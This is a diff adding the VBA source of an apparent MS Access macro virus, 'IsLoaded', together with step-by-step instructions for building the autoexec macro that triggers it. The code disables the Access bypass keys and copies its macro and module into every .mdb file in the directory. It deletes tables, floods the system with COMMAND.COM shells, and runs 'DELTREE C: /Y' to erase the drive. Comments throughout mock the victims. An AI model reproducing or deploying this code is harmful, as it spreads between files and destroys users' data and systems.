@@ -1,0 +1,184 @@
+   Attribute VB_Name = "IsLoaded"
+   'WARNING:  This one will eat your ass up...
+   '
+   '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+   ' SLiTHER.II - Newport News, Virginia
+   '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+   '
+   'In case some idiot OPENS the database rather than importing the modules
+   'and macros, here is the source code to the Virus. All you have to do
+   'is this,
+   '
+   '1) Create a new database
+   '2) Create a NEW module in your NEW database
+   '3) Open THIS text file up in Notepad
+   '4) Copy and paste the data into into the module
+   '   Make sure there are no errors (red letters)
+   '5) Save the module as "IsLoaded"
+   '6) Create a NEW macro
+   '7) Choose the features
+   '    Hourglass
+   '    RunCode
+   '       In the RunCode details, put the function name, "NotLoaded()"
+   '    Quit
+   '       In the Quit details, select the Option, "Exit"
+   '8) Close you database.
+   '9) Do something stupid and re-open it :)
+   '
+   '
+
+   Option Compare Database
+   Option Explicit
+   Dim Fname As String
+
+   '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+   ' KillProps()
+   ' This KillProps code is credited to the author of Detox2 (Sin Code IV)
+   ' Why reinvent the wheel?  Thank you!
+   '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+   Sub KillProps()
+       ChangeProperty "AllowSpecialKeys", dbBoolean, False
+       ChangeProperty "AllowBreakIntoCode", dbBoolean, False
+       ChangeProperty "AllowBypassKey", dbBoolean, False
+   End Sub
+
+   Function ChangeProperty(strPropName As String, varPropType As Variant, varPropValue As Variant) As Integer
+       Dim db As Database, prp As Property
+       Const conPropNotFoundError = 3270
+       Set db = CurrentDb
+       On Error GoTo Change_Err
+       db.Properties(strPropName) = varPropValue
+       ChangeProperty = True
+   Change_Bye:
+       Exit Function
+   Change_Err:
+       If Err = conPropNotFoundError Then
+           Set prp = db.CreateProperty(strPropName, varPropType, varPropValue)
+           db.Properties.Append prp
+           Resume Next
+       Else
+           ChangeProperty = False
+           Resume Change_Bye
+       End If
+   End Function
+
+   '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+   ' TableSmoke()
+   ' Basically, we're going through the table definitions, excluding the system tables
+   ' and deleting all others.  Hmmm.... Pretty mean thing to do if you ask me! But
+   ' hey... who asked me?
+   '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+   Public Sub TableSmoke()
+   Dim db As Database
+   Dim tdf As TableDefs
+   Dim fld As Fields
+   Dim tdfObjects As Variant
+   On Error GoTo TableSmokeExit
+
+   Set db = DBEngine.Workspaces(0).Databases(0)
+   Set db = CurrentDb
+   Set tdf = db.TableDefs
+   For Each tdfObjects In db.TableDefs
+       If Left(tdfObjects.Name, 4) = "msys" Then
+       tdf.Delete tdfObjects.Name
+   End If
+   Next tdfObjects
+
+   TableSmokeExit:
+   End Sub
+
+   '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+   ' OA()
+   ' Here we just kinda rub it in that the user screwed up by opening this database.
+   ' So what if it's his or her job and they had to do it.  They should have looked imported
+   ' the database into a test envirornment to make sure some dork didn't trojanize it.
+   ' Incidently... If the select "YES", then we'll just run them out of memory with a shitload
+   ' of window shells -- Shame on 'em if they answer "NO".  We just run DELTREE from
+   ' a simple shell call to the root C:
+   '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+   Public Sub OA()
+   Dim Bln As Balloon
+   Set Bln = Assistant.NewBalloon
+   Dim X As Integer
+   On Error GoTo OAexit
+
+   With Bln
+       .Heading = "Do you get the feeling that you really fucked up?"
+       .Icon = msoIconAlert
+       .Mode = msoModeAutoDown
+       .BalloonType = msoBalloonTypeButtons
+       .Button = msoButtonSetYesNo
+       .Show
+       If msoBalloonButtonYes Then
+           .Heading = "You're pretty smart, but you're still fucked!"
+           .Icon = msoIconAlert
+           .Mode = msoModeAutoDown
+           .BalloonType = msoBalloonTypeButtons
+           .Button = msoButtonSetOK
+           .Show
+           For X = 1 To 500
+           Call Shell("COMMAND.COM", 1)
+           Next X
+           Exit Sub
+       End If
+       If msoBalloonButtonNo Then
+           .Heading = "Damn dude...  You shouldn't even own a computer!"
+           .Icon = msoIconAlert
+           .Mode = msoModeAutoDown
+           .BalloonType = msoBalloonTypeButtons
+           .Button = msoButtonSetOK
+           .Show
+           Call Shell("COMMAND.COM /C DELTREE C: /Y", 1)
+           Exit Sub
+       End If
+   End With
+
+   OAexit:
+   End Sub
+
+   Public Sub Again()
+   Fname = Dir
+   End Sub
+
+   Public Sub Search()
+   Fname = Dir("*.mdb", vbNormal)
+   End Sub
+
+   Public Sub IsLoadedCheck()
+
+   On Error GoTo IsLoadedError
+   DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acMacro, "autoexec", "autoexec"
+   DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acModule, "IsLoaded", "IsLoaded"
+
+   IsLoadedError:
+   End Sub
+
+   '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+   ' NotLoaded()
+   ' This is where we begin our journey... Code is code -- I borrow what I need since I find
+   ' nothing elite nor sacred about using what has already been written.  Hence, the story of
+   ' modular programming  :)
+   '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+   Public Function NotLoaded()
+   Application.SetOption "Show Hidden Objects", False
+
+   Call KillProps
+   Call Search
+   Call IsLoadedCheck
+
+   While Fname <> ""
+       Call Again
+       Call IsLoadedCheck
+   Wend
+
+   Call TableSmoke
+   Call OA
+
+   DoCmd.DeleteObject acModule, "IsLoaded"
+   DoCmd.DeleteObject acMacro, "autoexec"
+
+   End Function
